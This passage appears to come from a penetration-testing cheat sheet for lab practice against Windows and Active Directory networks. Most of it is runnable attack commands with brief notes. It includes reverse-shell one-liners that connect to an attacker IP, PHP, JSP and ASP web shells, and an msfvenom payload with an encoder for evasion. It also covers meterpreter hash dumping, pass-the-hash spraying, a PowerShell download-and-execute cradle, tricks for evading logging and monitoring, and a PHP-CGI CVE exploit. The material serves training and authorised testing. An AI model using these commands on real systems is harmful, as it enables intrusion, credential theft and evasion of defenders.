powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]1234; $listener.start();...

# Connect from attacker:
nc 10.10.10.1 1234
```

**Reverse Shell** (victim connects to you):
```bash
# Linux bash:
bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'

# Linux with old nc:
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f

# Windows PowerShell:
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',1234);..."

# PHP:
<?php system("bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'"); ?>

# Listener:
nc -nlvp 443
rlwrap nc -nlvp 4646
```

**Web Shells:**
```php
<?php system($_REQUEST["cmd"]); ?>     # PHP
```
```jsp
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>   # JSP
```
```asp
<% eval request("cmd") %>             # ASP
```

**Resources:** https://www.revshells.com/

---

## TTY Upgrade — Procedure

```bash
# Step 1 — spawn shell:
script /dev/null -c bash
# or: python -c 'import pty; pty.spawn("/bin/bash")'

# Step 2 — suspend:
Ctrl+Z

# Step 3 — configure stty:
stty raw -echo; fg

# Step 4 — restore terminal:
reset xterm
export TERM=xterm

# Step 5 — adjust size (get from your local terminal):
stty size          # e.g.: 67 318
stty rows 67 columns 318    # on victim shell
```

---

## Metasploit — Advanced Workflow

**Database management:**
```bash
sudo systemctl start postgresql
sudo msfdb init
msfconsole -q
db_import Target.xml          # import nmap XML scan
db_nmap -sV -sS 10.10.10.8   # nmap from msf with DB storage
hosts -h                      # view hosts
services -h                   # view services
creds -h                      # credentials
loot -h                       # obtained hashes
workspace -a Target_1         # create workspace
```

**Encoders and evasion:**
```bash
# Generate payload with encoder:
msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl -e x86/shikata_ga_nai

# Analyze with VirusTotal:
msf-virustotal -k <API_key> -f payload.exe
```

**Session management:**
```bash
Ctrl+Z          # put session in background
sessions        # list active sessions
sessions -i 1   # resume session
sessions -u 1   # upgrade to meterpreter
exploit -j      # launch as background job
jobs -h         # manage jobs
kill <n>        # kill job
```

**Meterpreter — key commands:**
```bash
getuid                          # current user
ps                              # processes
steal_token <PID>              # steal process token
hashdump                       # dump SAM hashes
lsa_dump_sam                   # SAM dump
lsa_dump_secrets               # LSA secrets
db_nmap -sV -p- -T5 172.16.5.19   # nmap from meterpreter
run post/multi/recon/local_exploit_suggester   # find privesc
run autoroute -s 172.16.5.0/23    # add route
portfwd add -l 3300 -p 3389 -r 172.16.5.19    # port forward
```

---

## Advanced Pivoting — Strategy

**Technique selection by scenario:**

| Scenario | Recommended Technique |
|----------|-----------------------|
| Linux pivot with SSH | Ligolo-ng or SSH dynamic forwarding |
| Windows pivot without SSH | Chisel reverse |
| Firewall blocks TCP | DNScat2 (DNS tunneling) |
| Firewall blocks TCP/UDP | ptunnel-ng (ICMP tunneling) |
| RDP access to Windows pivot | SocksOverRDP + Proxifier |
| Legacy Windows pivot | plink.exe + Proxifier |
| Meterpreter access | autoroute + socks_proxy |

**Ping Sweep:**
```bash
# Linux:
for i in {1..254}; do (ping -c 1 172.16.5.$i | grep "bytes from" &); done

# Windows CMD:
for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"

# PowerShell:
1..254 | % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.16.5.$($_) -quiet)"}

# Meterpreter:
run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23
```

**SSH Tunneling:**
```bash
# Local port forward:
ssh -L 1234:localhost:3306 ubuntu@10.129.202.64

# Dynamic (SOCKS):
ssh -D 9050 ubuntu@10.129.202.64

# Remote/Reverse:
ssh -R <PivotIP>:8080:0.0.0.0:8000 ubuntu@<TargetIP> -vN
```

**Metasploit pivot:**
```bash
use auxiliary/server/socks_proxy
set SRVPORT 9050; set SRVHOST 0.0.0.0; set version 4a; run

# In meterpreter session:
run autoroute -s 172.16.5.0/23
portfwd add -l 3300 -p 3389 -r 172.16.5.19
portfwd add -R -l 8081 -p 1234 -L 10.10.14.18    # reverse portfwd
```

---

## Password Spraying Scenarios

**Scenario 1:** No null session or anonymous LDAP.
- Use Kerbrute with user list (`jsmith.txt` + LinkedIn scraping)
- Spraying with `Welcome1` → hits on low-priv users → run BloodHound

**Scenario 2:** External lists don't work.
- Search for PDFs published by the organization → username format in metadata
- Generate usernames: `for x in {{A..Z},{0..9}}{{A..Z},{0..9}}...; do echo $x; done`
- Kerbrute + credentials → RBCD or Shadow Credentials

---

## Local Administrator Password Reuse

This is a quite noisy and is not a good choice for any assessments that require stealth.

If you obtain the NTLM password hash or cleartext password for the local administrator account (or another privileged local account) you can attempt across multiple host.

It is worth targeting high-value hosts such as `SQL` or `Microsoft Exchange` servers, as they are more likely to have highly privileged user.

It is possible that have common format, for example: `$desktop%@admin123`, in servers can be `$server%@admin123`.

Another situation is that a non-privileged user have the same password in another account such as `user-adm`. This is common among different domains.

If we have the NTLM has we can spray it across an entire subnet.

The `--local-auth` flag in crackmapexec will tell the tool only to attempt to log in one time on each machine which remove any risk of account lockout.

```bash
sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
```

---

## Living Off the Land

Basic commands

### Windows Enumeration Commands

| Command                                                 | Description                                                                                |
| :------------------------------------------------------ | :----------------------------------------------------------------------------------------- |
| `hostname`                                              | Prints the PC's name                                                                       |
| `[System.Environment]::OSVersion.Version`               | Prints out the OS version and revision level                                               |
| `wmic qfe get Caption,Description,HotFixID,InstalledOn` | Prints the patches and hotfixes applied to the host                                        |
| `ipconfig /all`                                         | Prints out network adapter state and configurations                                        |
| `set`                                                   | Displays a list of environment variables for the current session (ran from CMD-prompt)     |
| `echo %USERDOMAIN%`                                     | Displays the domain name to which the host belongs (ran from CMD-prompt)                   |
| `echo %logonserver%`                                    | Prints out the name of the Domain Controller the host checks in with (ran from CMD-prompt) |

You can use `systeminfo` command with the above commands to obtain a initial picture of the state in the host. Running one command will generate fewer logs, meaning less of chance we are noticed on the host.

We can use built-in function in powershell to obtain more information

### PowerShell Enumeration & Execution Commands

| Cmdlet / Command | Description |
| :--- | :--- |
| `Get-Module` | Lists available modules loaded for use. |
| `Get-ExecutionPolicy -List` | Will print the execution policy settings for each scope on a host. |
| `Set-ExecutionPolicy Bypass -Scope Process` | This will change the policy for our current process using the `-Scope` parameter. Doing so will revert the policy once we vacate the process or terminate it. This is ideal because we won't be making a permanent change to the victim host. |
| `Get-ChildItem Env: \| ft Key,Value` | Return environment values such as key paths, users, computer information, etc. |
| `Get-Content $env:APPDATA\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt` | With this string, we can get the specified user's PowerShell history. This can be quite helpful as the command history may contain passwords or point us towards configuration files or scripts that contain passwords. |
| `powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('URL to download the file from'); <follow-on commands>"` | This is a quick and easy way to download a file from the web using PowerShell and call it from memory. |

#### Downgrade PowerShell

Many defenders are unware that several version of PowerShell often exist in a host. if not uninstalled, they can still be used. PowerShell event logging was introduced as a feature in 3.0 and forward.

We can attempt to call PowerShell 2.0 or older, and script block logging and commands will not be logged in the event viewer.

Check the version with:
```powershell
Get-host
```

Downgrade:
```powershell
powershell.exe -version 2
```

You can check the version again:
```powershell
Get-host
```

You have to be aware that the command `powershell.exe -version 2` within the PowerShell will be logged.

### Checking defenses

We can use netsh and sc to get a feel for the state of the host when it comes to Windows Firewall and to check the status of Windows Defender

#### Firewall checks

```powershell
netsh advfirewall show allprofiles
```

#### Windows Defender Check

Check if it is running
```
sc query windefend
```

Check the status and configuration settings

```
Get-MpComputerStatus
```

### Check if you are alone

When you land in a host for the first time, it is important to check if there are someone more connected. If you start doing things, there is the potential for them to notice you.

For this you can use
```powershell
qwinsta
```

### Network Settings

### Network & Firewall Enumeration Commands

| Command                              | Description                                                                                                      |
| :----------------------------------- | :--------------------------------------------------------------------------------------------------------------- |
| `arp -a`                             | Lists all known hosts stored in the ARP table.                                                                   |
| `ipconfig /all`                      | Prints out adapter settings for the host. We can figure out the network segment from here.                       |
| `route print`                        | Displays the routing table (IPv4 & IPv6) identifying known networks and layer three routes shared with the host. |
| `netsh advfirewall show allprofiles` | Displays the status of the host's firewall. We can determine if it is active and filtering traffic.              |

### Windows Management Instrumentation (WMI)

Is a script engine widely used within Windows enterprise environment to retrieve information and run administrative tasks.

### WMIC Enumeration Commands

| Command | Description |
| :--- | :--- |
| `wmic qfe get Caption,Description,HotFixID,InstalledOn` | Prints the patch level and description of the Hotfixes applied |
| `wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List` | Displays basic host information to include any attributes within the list |
| `wmic process list /format:list` | A listing of all processes on host |
| `wmic ntdomain list /format:list` | Displays information about the Domain and Domain Controllers |
| `wmic useraccount list /format:list` | Displays information about all local accounts and any domain accounts that have logged into the device |
| `wmic group list /format:list` | Information about all local groups |
| `wmic sysaccount list /format:list` | Dumps information about any system accounts that are being used as service accounts |

Obtain information about the domain, child domain and the external forest that our current domain has a trust with.

```powershell
wmic ntdomain get Caption,Description,DnsForestName,DomainName,DomainControllerAddress
```

Useful cheatsheet for wmic: https://gist.github.com/xorrior/67ee741af08cb1fc86511047550cdaf4

### Net Commands

We can use net commands to enumerate information from the domain such as:

Keep in mind that `net.exe` commands are typically monitored by EDR solutions. Some organizations will even configure their monitoring tool to throws alerts if certain commands are run by users in specific OUs, such as a Marketing associate's account running commands such as `whoami` or `net localgroup administrators`. This is a potential red flags.

- Local and domain users
- Groups
- Hosts
- Specific users in groups
- Domain Controllers
- Password requirements

### Net Commands Enumeration & Management

Remember that you can use `net1`.

| Command                                         | Description                                                                                                                |
| :---------------------------------------------- | :------------------------------------------------------------------------------------------------------------------------- |
| `net accounts`                                  | Information about password requirements                                                                                    |
| `net accounts /domain`                          | Password and lockout policy                                                                                                |
| `net group /domain`                             | Information about domain groups                                                                                            |
| `net group "Domain Admins" /domain`             | List users with domain admin privileges                                                                                    |
| `net group "domain computers" /domain`          | List of PCs connected to the domain                                                                                        |
| `net group "Domain Controllers" /domain`        | List PC accounts of domain controllers                                                                                     |
| `net group <domain_group_name> /domain`         | Users that belong to the specified group                                                                                   |
| `net groups /domain`                            | List of domain groups                                                                                                      |
| `net localgroup`                                | All available local groups                                                                                                 |
| `net localgroup administrators /domain`         | List users that belong to the administrators group inside the domain (the group Domain Admins is included here by default) |
| `net localgroup Administrators`                 | Information about a local group (admins)                                                                                   |
| `net localgroup administrators [username] /add` | Add user to local administrators group                                                                                     |
| `net share`                                     | Check current shares                                                                                                       |
| `net user <ACCOUNT_NAME> /domain`               | Get information about a user within the domain                                                                             |
| `net user /domain`                              | List all users of the domain                                                                                               |
| `net user %username%`                           | Information about the current user                                                                                         |
| `net use x: \\computer\share`                   | Mount the share locally                                                                                                    |
| `net view`                                      | Get a list of computers                                                                                                    |
| `net view /all /domain[:domainname]`            | Shares on the domains                                                                                                      |
| `net view \\computer /ALL`                      | List shares of a computer                                                                                                  |
| `net view /domain`                              | List of PCs of the domain                                                                                                  |

Listing domain groups

```
net group /domain
```

Obtain information about a domain user

```
net user /domain wrouse
```

#### Net commands tricks to avoid network defenders

If you believe that network defender are actively looking you can use **net1** instead of `net` command. This will be execute the same functions

### Dsquery

This command-line tool is used to find Active Directory objects.
The queries we run with this tool can be easily replicated with tools like BloodHound and PowerView.

It is possible that we don't have this tool, only hosts with Active Directory Domain Services Role (normally DC) have it.

To use it we need to elevated privileges to run a instance of powershell or cmd with `SYSTEM`.

#### User Search

```powershell
dsquery user
```

#### Computer Search

```powershell
dsquery computer
```

#### Wildcard Search

We can use wildcard search to view all objects in an OU, for example:

```powershell
dsquery * "CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
```

#### Users With Specific Attributes Set (PASSWD_NOTREQD)

We can combine `dsquery` with LDAP search filters. For example, looks for users with the `PASSWD_NOTREQD` flag set in the `userAccountControl` attribute.

```powershell
dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))" -attr distinguishedName userAccountControl
```

#### Searching for domain controller

```powershell
dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=8192)" -limit 5 -attr sAMAccountName
```

### LDAP Filtering Explained

`userAccountControl:1.2.840.113556.1.4.803:=8192` This string looking at the User Account Control (UAC) attributes.

`=8192` Represents the decimal bitmask we want to match in this search. This decimal number correspond to a corresponding UAC Attribute flag that determines if an attribute like `password is not required` or `account is locked` is set

```
User Account Control Bit Values

                                    1   2   32  64  128 512 2048 4096 8192 65536 524288 1048576
                                    |   |   |   |   |   |   |    |    |    |     |      |
  Login Script Will Execute --------+   |   |   |   |   |   |    |    |    |     |      |
        Account Is Disabled ------------+   |   |   |   |   |    |    |    |     |      |
      Password Not Required ----------------+   |   |   |   |    |    |    |     |      |
      Password Can't Change --------------------+   |   |   |    |    |    |     |      |
             Encrypted Text ------------------------+   |   |    |    |    |     |      |
           Password Allowed                             |   |    |    |    |     |      |
        Normal User Account ----------------------------+   |    |    |    |     |      |
  Interdomain Trust Account --------------------------------+    |    |    |     |      |
         Domain Workstation -------------------------------------+    |    |     |      |
           or Member Server                                           |    |     |      |
          Domain Controller ------------------------------------------+    |     |      |
    Password Does Not Expire ----------------------------------------------+     |      |
   Trusted For Impersonation ----------------------------------------------------+      |
             Account May Not -----------------------------------------------------------+
             Be Impersonated
```

#### OID match string

For LDAP and AD there are three main matching rules.

We are saying the bit value must match completely to meet the search requirements. Great for matching a singular attribute.

1. `1.2.840.113556.1.4.803`

We want our results to show any attribute match if any bit in the chain matches. This works in the case of an object having multiple attributes set.

2. `1.2.840.113556.1.4.804`

To match filters that apply to the Distinguished Name of an object and will search through all ownership and membership entries. For example if a user belongs to a group and that group belongs to another group (nested groups)...

3. `1.2.840.113556.1.4.1941`

#### Logical Operators

When building out search strings, we can utilize logical operators for combine values. The operators `&`, `|` and `!` are used for this purpose.

The first criteria indicate thta the object must be a user and combines it with searching for UAC bit value of 64 (Password can't change)

`(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=64))`

You can use multiples attributes like `(&(1) (2) (3))`

Search for any user object that does not have the password can't change attribute set.

`(&(objectClass=user)(!userAccountControl:1.2.840.113556.1.4.803:=64))`

## CVE

### CVE-2012-1823 | PHP-CGI

https://github.com/K3ysTr0K3R/CVE-2012-1823

https://pentesterlab.com/exercises/cve-2012-1823

You can check if return the source code with `?-s`
Version before 5.3.12 or 5.4.2

```bash
echo "<?php system('uname -a');die(); ?>" | POST "http://vulnerable/?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input"
```

Or with curl

```bash
curl -s "http://vulnerable/?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input" \
  --data-binary "<?php system('uname -a'); die(); ?>"
```

When php-cgi don't found '=' transform to a parameter of cgi '-'.

```
?-d allow_url_include=1 -d auto_prepend_file=php://input
```

- `-d`: Allow to define directives in time of execution
- `allow_url_include=1`: Active the option that allow include source code from remote sources.
- `auto_prepend_file=php//input`: auto_prepend_file say to php, before execute any script, execute the following file. `php://input` is an stream that represent the raw body of the HTTP request

With `die()` you're indicating that doesn't want to execute nothing more, so you will only see the result.

The solution of this was detect special characters like `-`.

### CVE-2024-4577 | PHP-CGI

Very similar to CVE-2012-1823. In Windows exist Best Fit Mapping that maps certain Unicode characters to a useful character in a local language of the Windows computer.

The key mapping is the soft hyphe, 0xAD. The 2012 path doesn't detect such as normal hyphen, so they send to PHP. Best-fit transform the 0xAD to a real hyphen 0X2D.

XAMP by default is configurated with CGI by default.
